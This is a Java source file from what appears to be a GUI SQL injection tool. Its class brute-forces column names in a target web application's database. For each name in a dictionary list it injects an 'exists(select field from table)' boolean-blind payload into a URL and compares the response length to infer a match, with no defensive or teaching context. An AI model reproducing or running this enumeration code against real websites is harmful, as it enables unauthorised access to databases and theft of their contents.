package com.sql;

import java.util.List;

import javax.swing.JButton;
import javax.swing.table.DefaultTableModel;

public class GetColumnName implements Runnable{
	private String url;
	private String urlHead;
	private String urlEnd;
	private List<String> column;
	private boolean flag=true;
	private JButton parseColumnBtn;
	private JButton parseValueBtn;
	private DefaultTableModel showColumn;
	private String tableName;
	private int contentLen;
	private List<String> columnName;
	public GetColumnName(String url,String urlHead,String urlEnd,JButton parseColumnBtn,JButton parseValueBtn,DefaultTableModel showColumn,List<String> column,String tableName,List<String> columnName) {
		// TODO Auto-generated constructor stub
		this.url=url;
		this.urlEnd=urlEnd;
		this.urlHead=urlHead;
		this.parseColumnBtn=parseColumnBtn;
		this.parseValueBtn=parseValueBtn;
		this.showColumn=showColumn;
		this.column=column;
		this.tableName=tableName;
		this.contentLen=IsExistInjection.getContent(this.url).length();
		this.columnName=columnName;
	}
	@Override
	public void run() {
		int i = 0;
//		List<String> columnName = new FileTools().getData("FieldName.txt");// 创建一个链表来存储从数据字典中读取到的字段名，数据字典来源于啊D
		while(i<columnName.size()&&flag==true) {// 测试字典中的每一个字段名是否出现在该表中
			if (testColumnName(columnName.get(i), tableName)){
				column.add(columnName.get(i));// 如果非空，表名该字段名在该表中出现，将该字段名添加到链表里
				Object[] obj={columnName.get(i)};
				showColumn.addRow(obj);
			}
			i++;
		}
		parseColumnBtn.setText("检测列名");
		if(!column.isEmpty())
			parseValueBtn.setEnabled(true);
	}
	public boolean testColumnName(String fieldName, String tableName) {// 测试字段名是否正确
		/*
		 * 猜测字段名 and exists(select 字段名 from 表名) 直到返回正确页面
		 */
		String testUrl = urlHead + "exists(select%20" + fieldName
				+ "%20from%20" + tableName + ")" + urlEnd;
		try {
			if (IsExistInjection.isRightPage(this.contentLen, testUrl))
				return true;
			else
				return false;
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return false;
		}
	}
	public void stop(){
		flag=false;
	}
}
